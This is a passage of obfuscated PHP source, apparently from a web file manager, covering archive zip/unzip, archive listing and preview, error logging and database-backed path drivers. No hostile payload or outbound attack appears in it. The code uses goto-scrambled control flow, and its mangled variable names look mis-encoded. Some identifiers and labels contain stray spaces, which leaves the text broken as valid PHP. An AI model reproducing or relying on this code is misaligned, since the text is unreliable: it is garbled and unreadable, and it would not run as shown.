$BûÇ√Ω¯çÆ; $e≠»˜éáè– = array($eõâ£÷®æ§[1066] => $eõâ£÷®æ§[1074], $eõâ£÷®æ§[6] => $FµÖæü®óô); } else { if (!$BûÇ√Ω¯çÆ) { $BûÇ√Ω¯çÆ = $BÊ…ë¡ı≥»[$eõâ£÷®æ§[395]]; } } break; default: $BûÇ√Ω¯çÆ = $FµÖæü®óô[$eõâ£÷®æ§[76]]; $e≠»˜éáè– = array($eõâ£÷®æ§[1066] => $eõâ£÷®æ§[1075]); break; } $BäºÑà≈ö∂ = $FµÖæü®óô[$eõâ£÷®æ§[76]]; if (!isset(self::$driverCache[$BäºÑà≈ö∂])) { $eÆˆπÎß‹” = strtolower($e≠»˜éáè–[$eõâ£÷®æ§[94]]); $dúˆîÑ¥ï≤ = $GLOBALS[$eõâ£÷®æ§[6]][$eõâ£÷®æ§[88]][$eõâ£÷®æ§[791]]; $bõÑÇ≤òû∞ = $eõâ£÷®æ§[72] . (isset($dúˆîÑ¥ï≤[$eÆˆπÎß‹”]) ? $dúˆîÑ¥ï≤[$eÆˆπÎß‹”] : ucfirst($eÆˆπÎß‹”)); if (!class_exists($bõÑÇ≤òû∞)) { show_json("{$bõÑÇ≤òû∞}\40\x6e\157\x74\x20\x65\170\151\x73\x74\163\x21", !1); } $Aà”Ω’€Ñ‚ = isset($e≠»˜éáè–[$eõâ£÷®æ§[6]]) ? $e≠»˜éáè–[$eõâ£÷®æ§[6]] : !1; self::$driverCache[$BäºÑà≈ö∂] = new $bõÑÇ≤òû∞($Aà”Ω’€Ñ‚); } goto a∂Ñ◊Ñå‹ä; a∂Ñ◊Ñå‹ä: $CÛ¶‹ÿ¶÷Â = self::$driverCache[$BäºÑà≈ö∂]; $CÛ¶‹ÿ¶÷Â->pathDriver = $EúÑû¥‡Í≠; $CÛ¶‹ÿ¶÷Â->pathBase = $eõâ£÷®æ§[33]; goto aÍ÷‘ÈÙ¨¡; eŒÌäñ˜ãµ: } public static function errorTips($A¢¿øÔÛ‹± = false) { goto Cú∞ø•ä√Î; Cú∞ø•ä√Î: $eﬁ—ùÈ÷“¬ =& $_SERVER[ú∫]; static $d“©à‹‰‹à = array(); $D∞‚◊Ú√∏® = 1000; goto e’‡áääú≈; e’‡áääú≈: if ($A¢¿øÔÛ‹± === -1) { return $d“©à‹‰‹à ? $d“©à‹‰‹à[count($d“©à‹‰‹à) - 1] : $eﬁ—ùÈ÷“¬[33]; } if ($A¢¿øÔÛ‹± === !1) { return implode($eﬁ—ùÈ÷“¬[229], $d“©à‹‰‹à); } if (count($d“©à‹‰‹à) >= $D∞‚◊Ú√∏®) { $d“©à‹‰‹à = array_slice($d“©à‹‰‹à, $D∞‚◊Ú√∏® * 0.5, $D∞‚◊Ú√∏®); } goto FàÂÜ±Ÿ«‰; FàÂÜ±Ÿ«‰: $d“©à‹‰‹à[] = $A¢¿øÔÛ‹±; write_log($eﬁ—ùÈ÷“¬[160] . ACTION . $eﬁ—ùÈ÷“¬[1077] . $A¢¿øÔÛ‹±, $eﬁ—ùÈ÷“¬[1078]); goto dÚáâ„Á±Ü; dÚáâ„Á±Ü: } public static function getLastError($Aâã∆“Ì¢Â = '') { $B¿é‚Ÿè∫… = self::errorTips(-1); return $B¿é‚Ÿè∫… ? $B¿é‚Ÿè∫… : $Aâã∆“Ì¢Â; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $dêçæ±∏ï ; if (!$dêçæ±∏ï ) { $DîÌµÚàƒé = IO::init($_SERVER[ú∫][8]); } return $DîÌµÚàƒé; } private static function iconvSystem($eÛ˜Â„Íˆê) { return self::local()->iconvSystem($eÛ˜Â„Íˆê); } private static function iconvApp($B˜îÑÕ†œŸ) { return self::local()->iconvApp($B˜îÑÕ†œŸ); } public static function zip($D©ùÉ÷ØŒﬁ, $F®ç±»‚ı´ = "\172\151\160", $CÙ§Ô·µÑ∫ = '', $e¥“êê≤¡Ñ = REPEAT_RENAME) { goto EÍø©©åë∑; cèà£ò–æœ: foreach ($b≤Ã»Ø±àƒ as $fÚÏâ√ôöã => $eœá¶∂ïàã) { $b≤Ã»Ø±àƒ[$fÚÏâ√ôöã] = self::iconvSystem($eœá¶∂ïàã); } KodArchive::create($b“ä±Ô≥€·, $b≤Ã»Ø±àƒ); if (!IO::exist($Fû¥â§æ∑à)) { if ($DÓ˜∏¥∆Æ”) { del_dir($DÓ˜∏¥∆Æ”); } show_json(LNG($D•´Ó”ˆ€Ñ[1081]), !1); } goto cö€†ë¢ªí; EÍø©©åë∑: $D•´Ó”ˆ€Ñ =& $_SERVER[ú∫]; $cãÖÂ©‘∂∏ = self::init($D©ùÉ÷ØŒﬁ[0][$D•´Ó”ˆ€Ñ[76]]); $e±·ªë››Ö = self::info($D©ùÉ÷ØŒﬁ[0][$D•´Ó”ˆ€Ñ[76]]); goto aíàÜòÂú–; cù˜Íπº¢Õ: $Fû¥â§æ∑à = $C›úœ•…—ú . $Dﬂ”Ωœ—‹Ç . $D•´Ó”ˆ€Ñ[95] . $F®ç±»‚ı´; $Fû¥â§æ∑à = get_filename_auto($Fû¥â§æ∑à, $D•´Ó”ˆ€Ñ[33], $e¥“êê≤¡Ñ); $b“ä±Ô≥€· = self::iconvSystem($Fû¥â§æ∑à); goto cèà£ò–æœ; BÉªåÇ´ ƒ: if (!$EìàîµóØ‹) { del_dir($DÓ˜∏¥∆Æ”); show_json(LNG($D•´Ó”ˆ€Ñ[1081]), !1); } del_dir($DÓ˜∏¥∆Æ”); return $EìàîµóØ‹; goto A»ÏÈ¨—≤¿; dçÛÉ≈˘õ: if (count($b≤Ã»Ø±àƒ) > 1) { $E†´¡Ö¬ÊΩ = IO::info(IO::pathFather($e±·ªë››Ö[$D•´Ó”ˆ€Ñ[76]])); $Dﬂ”Ωœ—‹Ç = $E†´¡Ö¬ÊΩ[$D•´Ó”ˆ€Ñ[28]]; } $C›úœ•…—ú = $DÓ˜∏¥∆Æ”; if (!$C›úœ•…—ú) { $C›úœ•…—ú = get_path_father($e±·ªë››Ö[$D•´Ó”ˆ€Ñ[76]]); if (!$CÙ§Ô·µÑ∫ && $cãÖÂ©‘∂∏->getType() == $D•´Ó”ˆ€Ñ[106]) { $C›úœ•…—ú = get_path_father($cãÖÂ©‘∂∏->path); } $dÏÌ∏Î£ﬂ = IO::info($C›úœ•…—ú); if (!$dÏÌ∏Î£ﬂ[$D•´Ó”ˆ€Ñ[196]]) { show_json(LNG($D•´Ó”ˆ€Ñ[1080]), !1); } } goto cù˜Íπº¢Õ; aíàÜòÂú–: $DÓ˜∏¥∆Æ” = !1; if (!$CÙ§Ô·µÑ∫ && $cãÖÂ©‘∂∏->getType() == $D•´Ó”ˆ€Ñ[106]) { $b≤Ã»Ø±àƒ = self::zipFileList($D©ùÉ÷ØŒﬁ); } else { $DÓ˜∏¥∆Æ” = $CÙ§Ô·µÑ∫ ? $CÙ§Ô·µÑ∫ : TEMP_FILES . $D•´Ó”ˆ€Ñ[1079] . time() . rand_string(8) . $D•´Ó”ˆ€Ñ[8]; mk_dir($DÓ˜∏¥∆Æ”); $b≤Ã»Ø±àƒ = self::zipFileList($D©ùÉ÷ØŒﬁ, $DÓ˜∏¥∆Æ”); } $Dﬂ”Ωœ—‹Ç = $e±·ªë››Ö[$D•´Ó”ˆ€Ñ[28]]; goto dçÛÉ≈˘õ; cö€†ë¢ªí: if ($CÙ§Ô·µÑ∫ || !$DÓ˜∏¥∆Æ”) { if ($DÓ˜∏¥∆Æ” && strstr($DÓ˜∏¥∆Æ”, TEMP_FILES)) { $bå©‘´àΩñ = $b≤Ã»Ø±àƒ = array(); recursion_dir($C›úœ•…—ú, $bå©‘´àΩñ, $b≤Ã»Ø±àƒ, 0); foreach ($bå©‘´àΩñ as $D¢ﬁﬁÔ Ñ’) { del_dir($D¢ﬁﬁÔ Ñ’); } foreach ($b≤Ã»Ø±àƒ as $DƒŸò›Á“â) { if ($DƒŸò›Á“â == $b“ä±Ô≥€·) { continue; } del_file($DƒŸò›Á“â); } } return $Fû¥â§æ∑à; } $Bÿ≥Ó»è§± = self::pathFather($e±·ªë››Ö[$D•´Ó”ˆ€Ñ[76]]); $EìàîµóØ‹ = self::move($Fû¥â§æ∑à, $Bÿ≥Ó»è§±, $e¥“êê≤¡Ñ); goto BÉªåÇ´ ƒ; A»ÏÈ¨—≤¿: } public static function unzip($DÈ∏‚ƒ∑Ì±, $eê÷≈πîü‰ = "\x72\145\160\154\141\x63\145") { goto dÈìÍ”ôç´; c’∫Õª±©æ: foreach ($Cß®∞ìÜ»Ø as $eÜ¯‰àâÜﬁ) { $eÜ¯‰àâÜﬁ = self::iconvApp($eÜ¯‰àâÜﬁ); self::move($eÜ¯‰àâÜﬁ, $DÊàÚã„êê, $eê÷≈πîü‰); } del_dir($eÉ•´•⁄∂∏); if (!$Dı‰É¢Ï⁄˘) { del_file($E«ª≈ÊÚõÑ); } goto C§±Ø…éÖﬂ; D⁄›ÌÊﬂ¡ˆ: $Fê´—Éßúã = KodArchive::extract($E«ª≈ÊÚõÑ, $eÉ•´•⁄∂∏ . $d˜æâ∏¿≥Ω[8], $aßöåÜÇÀ∏); self::archiveExt(); if (!$Fê´—Éßúã[$d˜æâ∏¿≥Ω[1086]]) { show_json($d˜æâ∏¿≥Ω[1087] . $Fê´—Éßúã[$d˜æâ∏¿≥Ω[1088]], !1); } goto B€¨ã†† ô; C§±Ø…éÖﬂ: return !0; goto dÆƒ—”ÃÜ∞; B€¨ã†† ô: Hook::trigger($d˜æâ∏¿≥Ω[1089], $eÉ•´•⁄∂∏); recursion_dir($eÉ•´•⁄∂∏, $dŒ ®Öºó¡, $cÃéé≈¿Ô…, 0); $Cß®∞ìÜ»Ø = array_merge($dŒ ®Öºó¡, $cÃéé≈¿Ô…); goto c’∫Õª±©æ; D≥‚“ﬂıëÛ: if (!($e“¨°´¡“± = parent::info($D¡Úâá”éà))) { show_json(LNG($d˜æâ∏¿≥Ω[1083]), !1); } if (!($cä‚≈Ò‚Õ“ = parent::infoFull($DÊàÚã„êê))) { $DÊàÚã„êê = parent::mkdir($DÊàÚã„êê); $cä‚≈Ò‚Õ“ = array($d˜æâ∏¿≥Ω[76] => $DÊàÚã„êê); } else { if (isset($cä‚≈Ò‚Õ“[$d˜æâ∏¿≥Ω[395]]) && trim($cä‚≈Ò‚Õ“[$d˜æâ∏¿≥Ω[76]], $d˜æâ∏¿≥Ω[8]) != trim($DÊàÚã„êê, $d˜æâ∏¿≥Ω[8])) { $bò≠ãáÚÆä = KodIO::make($cä‚≈Ò‚Õ“[$d˜æâ∏¿≥Ω[478]]); $Cªäﬁª®ò = parent::fileNameAuto($bò≠ãáÚÆä, $cä‚≈Ò‚Õ“[$d˜æâ∏¿≥Ω[28]], REPEAT_RENAME_FOLDER, !0); $DÊàÚã„êê = parent::mkdir($bò≠ãáÚÆä . $Cªäﬁª®ò); $cä‚≈Ò‚Õ“ = array($d˜æâ∏¿≥Ω[76] => $DÊàÚã„êê); } } $DÊàÚã„êê = $cä‚≈Ò‚Õ“[$d˜æâ∏¿≥Ω[76]]; goto fù‹èè°üœ; fù‹èè°üœ: $cñÕàü†ŒØ = self::tmpFileName($e“¨°´¡“±); $eÉ•´•⁄∂∏ = TEMP_FILES . $cñÕàü†ŒØ; del_dir($eÉ•´•⁄∂∏); goto e—¨ä“•Öœ; e—¨ä“•Öœ: mk_dir($eÉ•´•⁄∂∏); $dÆÜ‘∏´ìé = self::fileExt($e“¨°´¡“±); $E«ª≈ÊÚõÑ = $eÉ•´•⁄∂∏ . $d˜æâ∏¿≥Ω[95] . $dÆÜ‘∏´ìé; goto D‚∆¯Ü’©∂; dÈìÍ”ôç´: $d˜æâ∏¿≥Ω =& $_SERVER[ú∫]; $D¡Úâá”éà = $DÈ∏‚ƒ∑Ì±[$d˜æâ∏¿≥Ω[76]]; $DÊàÚã„êê = $DÈ∏‚ƒ∑Ì±[$d˜æâ∏¿≥Ω[1082]]; goto D≥‚“ﬂıëÛ; D‚∆¯Ü’©∂: if (!@file_exists(self::iconvSystem($E«ª≈ÊÚõÑ))) { $Dı‰É¢Ï⁄˘ = self::localFilePath($D¡Úâá”éà, $dÆÜ‘∏´ìé); $E«ª≈ÊÚõÑ = $Dı‰É¢Ï⁄˘ ? $Dı‰É¢Ï⁄˘ : parent::download($D¡Úâá”éà, $E«ª≈ÊÚõÑ); } $E«ª≈ÊÚõÑ = self::iconvSystem($E«ª≈ÊÚõÑ); $aßöåÜÇÀ∏ = isset($DÈ∏‚ƒ∑Ì±[$d˜æâ∏¿≥Ω[1084]]) ? $DÈ∏‚ƒ∑Ì±[$d˜æâ∏¿≥Ω[1084]] : $d˜æâ∏¿≥Ω[1085]; goto D⁄›ÌÊﬂ¡ˆ; dÆƒ—”ÃÜ∞: } public static function unzipList($DÆ∞·˜ºÖ’) { goto DâªªßµÉŸ; f ¨Ú∂†©ﬁ: $CÜ°ë›ƒÊâ = self::info($D¨Ÿ›ê∂‹†); $cü≈∆ì¢Â… = self::fileExt($CÜ°ë›ƒÊâ); $DôõûÉ˜ÚΩ = self::tmpFileName($CÜ°ë›ƒÊâ); goto bÏËÌÎú ø; bÏËÌÎú ø: if (isset($E®Â’Á…ôÀ)) { $a®ôÁ¢“…´ = array($E®Â’Á…ôÀ[$EﬁòÿÁ¡ãˆ[76]], $E®Â’Á…ôÀ[$EﬁòÿÁ¡ãˆ[1090]], $E®Â’Á…ôÀ[$EﬁòÿÁ¡ãˆ[28]]); $CË˜ßˆÖÛÑ = md5(implode($EﬁòÿÁ¡ãˆ[71], $a®ôÁ¢“…´)) . $EﬁòÿÁ¡ãˆ[95] . get_path_ext($E®Â’Á…ôÀ[$EﬁòÿÁ¡ãˆ[28]]); } else { $a®ôÁ¢“…´ = array($CÜ°ë›ƒÊâ[$EﬁòÿÁ¡ãˆ[28]], $CÜ°ë›ƒÊâ[$EﬁòÿÁ¡ãˆ[76]], $CÜ°ë›ƒÊâ[$EﬁòÿÁ¡ãˆ[78]]); $CË˜ßˆÖÛÑ = md5(implode($EﬁòÿÁ¡ãˆ[71], $a®ôÁ¢“…´)) . $EﬁòÿÁ¡ãˆ[95] . $cü≈∆ì¢Â…; } if ($b©Ó≠¨á’É == -1) { $B˜€É¥…Í  = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\x56\151\x65\167\x2f{$DôõûÉ˜ÚΩ}\x2f{$CË˜ßˆÖÛÑ}\x2e\x6c\157\147"; $aéòÖ∞âáÃ = self::infoFull($B˜€É¥…Í ); if ($aéòÖ∞âáÃ) { $B˜€É¥…Í  = $aéòÖ∞âáÃ[$EﬁòÿÁ¡ãˆ[76]]; $A∑´ƒ§›÷Í = self::getContent($B˜€É¥…Í ); if ($A∑´ƒ§›÷Í) { $f∑à˘ùﬁ•æ = json_decode($A∑´ƒ§›÷Í, !0); if (count($f∑à˘ùﬁ•æ) >= $A≤òíÖ•ƒé) { show_json(sprintf(LNG($EﬁòÿÁ¡ãˆ[1092]), count($f∑à˘ùﬁ•æ)), !1); } return $f∑à˘ùﬁ•æ; } } else { $B˜€É¥…Í  = self::mkfile($B˜€É¥…Í ); } } $DΩŸáÒ…à∫ = TEMP_FILES . $DôõûÉ˜ÚΩ; goto F‹Œáºëøﬂ; b©∑äŸéª≠: return $EìŸüàÙê—[$EﬁòÿÁ¡ãˆ[1088]]; goto F’íáÃÀº; bÙÜÔ‹ ØÂ: self::archiveExt(); del_dir($DΩŸáÒ…à∫); if (!$EìŸüàÙê—[$EﬁòÿÁ¡ãˆ[1086]]) { show_json($EìŸüàÙê—[$EﬁòÿÁ¡ãˆ[1088]], !1); } goto DèíÊ‰‘Ãß; D‹Ì◊‹ÃçÈ: $A≤òíÖ•ƒé = 50000; if (request_url_safe($c∑á≈—á‹∂)) { $E®Â’Á…ôÀ = parse_url_query($c∑á≈—á‹∂); if (!isset($E®Â’Á…ôÀ[$EﬁòÿÁ¡ãˆ[76]])) { show_json($EﬁòÿÁ¡ãˆ[1091], !1); } } $D¨Ÿ›ê∂‹† = isset($E®Â’Á…ôÀ) ? $E®Â’Á…ôÀ[$EﬁòÿÁ¡ãˆ[76]] : $c∑á≈—á‹∂; goto f ¨Ú∂†©ﬁ; F‹Œáºëøﬂ: if (!is_dir($DΩŸáÒ…à∫)) { mk_dir($DΩŸáÒ…à∫); } $a–¨ê“πöÛ = $DΩŸáÒ…à∫ . $EﬁòÿÁ¡ãˆ[8] . $CË˜ßˆÖÛÑ; if (!@file_exists(self::iconvSystem($a–¨ê“πöÛ))) { if (isset($E®Â’Á…ôÀ)) { url_request($c∑á≈—á‹∂, $EﬁòÿÁ¡ãˆ[1093], $a–¨ê“πöÛ); } else { $BóÃÖñá†û = self::localFilePath($c∑á≈—á‹∂, $cü≈∆ì¢Â…); $a–¨ê“πöÛ = $BóÃÖñá†û ? $BóÃÖñá†û : self::download($c∑á≈—á‹∂, $a–¨ê“πöÛ); } } goto Aä≠°Ó…ÒÇ; Aä≠°Ó…ÒÇ: $a–¨ê“πöÛ = self::iconvSystem($a–¨ê“πöÛ); if ($b©Ó≠¨á’É >= 0) { $DÜ™ë´Âçà = isset($DÆ∞·˜ºÖ’[$EﬁòÿÁ¡ãˆ[1094]]) ? $DÆ∞·˜ºÖ’[$EﬁòÿÁ¡ãˆ[1094]] : !1; $aÙ‰Î∫£éã = isset($DÆ∞·˜ºÖ’[$EﬁòÿÁ¡ãˆ[28]]) ? $DÆ∞·˜ºÖ’[$EﬁòÿÁ¡ãˆ[28]] : $EﬁòÿÁ¡ãˆ[33]; KodArchive::filePreview($a–¨ê“πöÛ, $b©Ó≠¨á’É, $DÜ™ë´Âçà, $aÙ‰Î∫£éã); self::archiveExt(); die; } $EìŸüàÙê— = KodArchive::listContent($a–¨ê“πöÛ); goto bÙÜÔ‹ ØÂ; DâªªßµÉŸ: $EﬁòÿÁ¡ãˆ =& $_SERVER[ú∫]; $c∑á≈—á‹∂ = $DÆ∞·˜ºÖ’[$EﬁòÿÁ¡ãˆ[76]]; $b©Ó≠¨á’É = isset($DÆ∞·˜ºÖ’[$EﬁòÿÁ¡ãˆ[1090]]) ? $DÆ∞·˜ºÖ’[$EﬁòÿÁ¡ãˆ[1090]] : -1; goto D‹Ì◊‹ÃçÈ; DèíÊ‰‘Ãß: $f∑à˘ùﬁ•æ = json_encode($EìŸüàÙê—[$EﬁòÿÁ¡ãˆ[1088]]); self::setContent($B˜€É¥…Í , $f∑à˘ùﬁ•æ); if (count($EìŸüàÙê—[$EﬁòÿÁ¡ãˆ[1088]]) >= $A≤òíÖ•ƒé) { show_json(sprintf(LNG($EﬁòÿÁ¡ãˆ[1092]), count($EìŸüàÙê—[$EﬁòÿÁ¡ãˆ[1088]])), !1); } goto b©∑äŸéª≠; F’íáÃÀº: } private static function fileExt($d≥¥â—àƒü) { $E‹êöå¢é± =& $_SERVER[ú∫]; $fÖòÀŒë∫ÿ = $d≥¥â—àƒü[$E‹êöå¢é±[168]]; if ($fÖòÀŒë∫ÿ == $E‹êöå¢é±[1095]) { $fÃöÎ´∂üÜ = $E‹êöå¢é±[1096]; if (substr($d≥¥â—àƒü[$E‹êöå¢é±[28]], -strlen($fÃöÎ´∂üÜ)) == $fÃöÎ´∂üÜ) { $fÖòÀŒë∫ÿ = $E‹êöå¢é±[1097]; } } self::archiveExt($fÖòÀŒë∫ÿ); return $fÖòÀŒë∫ÿ; } private static function zipFileList($aÈ†…ÚŸãÀ, $c®≈®√Í≥ø = false) { $C—¡ôπË√é =& $_SERVER[ú∫]; $D¶™™åáÉÛ = array(); foreach ($aÈ†…ÚŸãÀ as $e¿ŒÚ∂Í‹«) { $F©©Ñ’Ÿ’ß = $e¿ŒÚ∂Í‹«[$C—¡ôπË√é[76]]; if ($c®≈®√Í≥ø) { $F©©Ñ’Ÿ’ß = self::copy($e¿ŒÚ∂Í‹«[$C—¡ôπË√é[76]], $c®≈®√Í≥ø, $C—¡ôπË√é[783]); } else { $c–à˜±Ûıˆ = self::init($e¿ŒÚ∂Í‹«[$C—¡ôπË√é[76]]); if ($c–à˜±Ûıˆ->getType() == $C—¡ôπË√é[106]) { $F©©Ñ’Ÿ’ß = $c–à˜±Ûıˆ->path; } } if ($F©©Ñ’Ÿ’ß && self::local()->exist($F©©Ñ’Ÿ’ß)) { $D¶™™åáÉÛ[$e¿ŒÚ∂Í‹«[$C—¡ôπË√é[76]]] = $F©©Ñ’Ÿ’ß; } } if (!empty($D¶™™åáÉÛ)) { return array_values($D¶™™åáÉÛ); } show_json(LNG($C—¡ôπË√é[1061]), !1); } public static function tmpFileName($B˜ØÛõ‹‘) { $Aí»≤êÍÏ— =& $_SERVER[ú∫]; $BÜ‘•ﬁ’€Ì = array($B˜ØÛõ‹‘[$Aí»≤êÍÏ—[28]], $B˜ØÛõ‹‘[$Aí»≤êÍÏ—[76]], $B˜ØÛõ‹‘[$Aí»≤êÍÏ—[78]], $B˜ØÛõ‹‘[$Aí»≤êÍÏ—[487]]); return md5(implode($Aí»≤êÍÏ—[71], $BÜ‘•ﬁ’€Ì)); } private static function localFilePath($cí∞≠À¢†Ÿ, $Aî‘˘àëÖÙ) { goto C˜°’‹Êí≈; C˜°’‹Êí≈: $aÊ“ƒÓΩ«€ =& $_SERVER[ú∫]; if ($Aî‘˘àëÖÙ == $aÊ“ƒÓΩ«€[1098] && strtoupper(substr(PHP_OS, 0, 3)) == $aÊ“ƒÓΩ«€[1099]) { return !1; } $cÆæÜÖçôÖ = KodIO::parse($cí∞≠À¢†Ÿ); goto AÔÉ‡ﬁÇòÃ; AÔÉ‡ﬁÇòÃ: if ($cÆæÜÖçôÖ[$aÊ“ƒÓΩ«€[29]] == KodIO::KOD_SOURCE) { $A»á€ØûèÂ = Model($aÊ“ƒÓΩ«€[790])->fileInfoGet(KodIO::sourceID($cí∞≠À¢†Ÿ)); if (!$A»á€ØûèÂ[$aÊ“ƒÓΩ«€[76]]) { show_json($aÊ“ƒÓΩ«€[1100], !1); } $cí∞≠À¢†Ÿ = $A»á€ØûèÂ[$aÊ“ƒÓΩ«€[76]]; } $CæÃùÚõåÜ = self::init($cí∞≠À¢†Ÿ); $Fù≤À˜“àÁ = $CæÃùÚõåÜ->getType(); goto f‡¨üé≈Ó; f‡¨üé≈Ó: if ($Fù≤À˜“àÁ == $aÊ“ƒÓΩ«€[106] || $Fù≤À˜“àÁ == $aÊ“ƒÓΩ«€[1101]) { if (!$CæÃùÚõåÜ->exist($CæÃùÚõåÜ->path)) { show_json(LNG($aÊ“ƒÓΩ«€[105]), !1); } return $CæÃùÚõåÜ->path; } return !1; goto A–…µ™¶Ãí; A–…µ™¶Ãí: } private static function archiveExt($b≈Ÿß—∫†è = '') { $GLOBALS[$_SERVER[ú∫][1102]] = $b≈Ÿß—∫†è; } } goto aÇÓπ¡¿å∏; AãüÚ’∂É◊: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($a»≥Ó…œ) { $this->pathParse = $a»≥Ó…œ; $this->model = Model($_SERVER[ú∫][1206]); } public function getPath($e’Î≥ë„Ï›) { return trim($e’Î≥ë„Ï›, $_SERVER[ú∫][8]); } public function pathFather($a‘‡—ÈÍ‹Æ) { $Eûπ∑‘„óü = $this->parse($a‘‡—ÈÍ‹Æ); $Eûπ∑‘„óü = $this->infoSimple($a‘‡—ÈÍ‹Æ); return $Eûπ∑‘„óü ? $Eûπ∑‘„óü[$_SERVER[ú∫][478]] : !1; } public function pathThis($a’ÙõãÔ™˘) { $DãØ∞◊í∆˘ = $this->infoSimple($a’ÙõãÔ™˘); return $DãØ∞◊í∆˘ ? $DãØ∞◊í∆˘[$_SERVER[ú∫][28]] : !1; } public function getPathOuter($EË”ã©Ïôá) { if (!$EË”ã©Ïôá) { return $EË”ã©Ïôá; } $dø∑ùÃÉ’Œ = $this->parse($EË”ã©Ïôá); return KodIO::make($dø∑ùÃÉ’Œ[$_SERVER[ú∫][393]]); } public function copyFolderFromIO($B°·ÁÍ–áñ, $d·√˜∫¶Âë, $aõ®ÿÈÀ∑¶, $e„¯†å®èÉ, $EîÏ‡√Øÿ÷) { $Bõô»©›âá = $this->model->copyFolderFromIO($B°·ÁÍ–áñ, $d·√˜∫¶Âë, $aõ®ÿÈÀ∑¶, $e„¯†å®èÉ, $EîÏ‡√Øÿ÷); return KodIO::make($Bõô»©›âá); } public function isParentOf($fŸ÷äóÁ¯”, $D·à®ëÌòÍ) { return $this->model->isParentOf($fŸ÷äóÁ¯”, $D·à®ëÌòÍ); } public function mkfile($FõıèÖÑ ‹, $B‡·åéÛ„“ = '', $Eº¬≠–å˘Î = REPEAT_RENAME) { $cø≥Ó∫⁄Îø =& $_SERVER[ú∫]; $aÑè—Ç‹ƒÚ = $this->parse($FõıèÖÑ ‹); $FõıèÖÑ ‹ = $aÑè—Ç‹ƒÚ[$cø≥Ó∫⁄Îø[393]]; for ($B∫›©Ü“é˜ = 0; $B∫›©Ü“é˜ < count($aÑè—Ç‹ƒÚ[$cø≥Ó∫⁄Îø[1207]]); $B∫›©Ü“é˜++) { $BÙ≠¯“ÜÎê = $aÑè—Ç‹ƒÚ[$cø≥Ó∫⁄Îø[1207]][$B∫›©Ü“é˜]; if ($B∫›©Ü“é˜ == count($aÑè—Ç‹ƒÚ[$cø≥Ó∫⁄Îø[1207]]) - 1) { $FõıèÖÑ ‹ = $this->model->mkfile($FõıèÖÑ ‹, $BÙ≠¯“ÜÎê, $B‡·åéÛ„“, $Eº¬≠–å˘Î); break; } $FõıèÖÑ ‹ = $this->model->mkdir($FõıèÖÑ ‹, $BÙ≠¯“ÜÎê, REPEAT_SKIP); } return $this->getPathOuter($FõıèÖÑ ‹); } public function mkdir($Fúå‘ß∑Ü‡, $eªôÇ∆ÍîÉ = REPEAT_SKIP) { $Bµ±àµ—≠Ô =& $_SERVER[ú∫]; $Eî≈ãÉª÷ = $this->parse($Fúå‘ß∑Ü‡); $Fúå‘ß∑Ü‡ = $Eî≈ãÉª÷[$Bµ±àµ—≠Ô[393]]; for ($d˜Ú‘áÙ—∆ = 0; $d˜Ú‘áÙ—∆ < count($Eî≈ãÉª÷[$Bµ±àµ—≠Ô[1207]]); $d˜Ú‘áÙ—∆++) { $aè¬ï”üΩ¬ = $Eî≈ãÉª÷[$Bµ±àµ—≠Ô[1207]][$d˜Ú‘áÙ—∆]; $Fúå‘ß∑Ü‡ = $this->model->mkdir($Fúå‘ß∑Ü‡, $aè¬ï”üΩ¬, $eªôÇ∆ÍîÉ); } return $this->getPathOuter($Fúå‘ß∑Ü‡); } public function copyFile($a√À¨ØìÊ‡, $AÊŸâ®éÜª, $d∆é≤‡≈üÓ = REPEAT_REPLACE) { $c·â¿ÏàË◊ =& $_SERVER[ú∫]; $déô–äÎ©ö = $this->parse($AÊŸâ®éÜª); $a•ëàÛ”√ = $this->model->copy($a√À¨ØìÊ‡, $déô–äÎ©ö[$c·â¿ÏàË◊[393]], $d∆é≤‡≈üÓ, $déô–äÎ©ö[$c·â¿ÏàË◊[76]]); return $a•ëàÛ”√ ? $this->getPathOuter($a•ëàÛ”√) : !1; } public function moveFile($bæÉö‚”Ì», $eÙúÆøÔ∑ª, $Eê∫ú»¡Îï = REPEAT_REPLACE) { $dÇ•™ÿ’Ñ´ =& $_SERVER[ú∫]; $a„Œ‘≈´áû = $this->parse($eÙúÆøÔ∑ª); $e≥¶¡Ç≈ëç = $this->model->move($bæÉö‚”Ì», $a„Œ‘≈´áû[$dÇ•™ÿ’Ñ´[393]], $Eê∫ú»¡Îï, $a„Œ‘≈´áû[$dÇ•™ÿ’Ñ´[76]]); return $e≥¶¡Ç≈ëç ? $this->getPathOuter($e≥¶¡Ç≈ëç) : !1; } public function copy($f„«ŒÑÿ≥», $BâÃï¨≥çµ, $Fâ™™à˜∏à = REPEAT_REPLACE) { $aãæ•Ê¬≠Ë = $this->parse($BâÃï¨≥çµ); $E„•›Öı£ÿ = $this->model->copy($f„«ŒÑÿ≥», $aãæ•Ê¬≠Ë[$_SERVER[ú∫][393]], $Fâ™™à˜∏à); return $E„•›Öı£ÿ ? $this->getPathOuter($E„•›Öı£ÿ) : !1; } public function moveSameAllow() { } public function move($d‰ã⁄ÜéˆÃ, $EÙ„Ñö≠öç, $FÊ°õèØëé = REPEAT_REPLACE) { $Dòœﬂë±ΩÓ = $this->parse($EÙ„Ñö≠öç); $AÖ¢“ëŸ’∫ = $this->model->move($d‰ã⁄ÜéˆÃ, $Dòœﬂë±ΩÓ[$_SERVER[ú∫][393]], $FÊ°õèØëé); return $AÖ¢“ëŸ’∫ ? $this->getPathOuter($AÖ¢“ëŸ’∫) : !1; } public function remove($D§å¶êﬂ’∑, $C“÷Ÿ¡£∑≠ = true) { return $this->model->remove($D§å¶êﬂ’∑, $C“÷Ÿ¡£∑≠); } public function rename($C‹·ãÌÇ‚, $e‚Ü»Ñ∫›Ü) { $BíÈÑ∫¬ÔÂ = $this->model->rename($C‹·ãÌÇ‚, $e‚Ü»Ñ∫›Ü); return $BíÈÑ∫¬ÔÂ ? $this->getPathOuter($C‹·ãÌÇ‚) : $BíÈÑ∫¬ÔÂ; } public function size($a«™ÖÚ”äÉ) { $E÷àÑÁ»ó± = $this->infoSimple($a«™ÖÚ”äÉ); return $E÷àÑÁ»ó± ? $E÷àÑÁ»ó±[$_SERVER[ú∫][78]] : 0; } public function infoSimple($BÜÈµüõÀª) { return $this->model->sourceInfo($BÜÈµüõÀª); } public function info($bó⁄ßı¿ÏÎ) { return $this->infoParse($bó⁄ßı¿ÏÎ); } public function infoAuth($A∂Õ‘ê›∫é) { return $this->infoParse($A∂Õ‘ê›∫é, !1, !0); } public function infoWithChildren($AçñÑØ¶Óä) { return 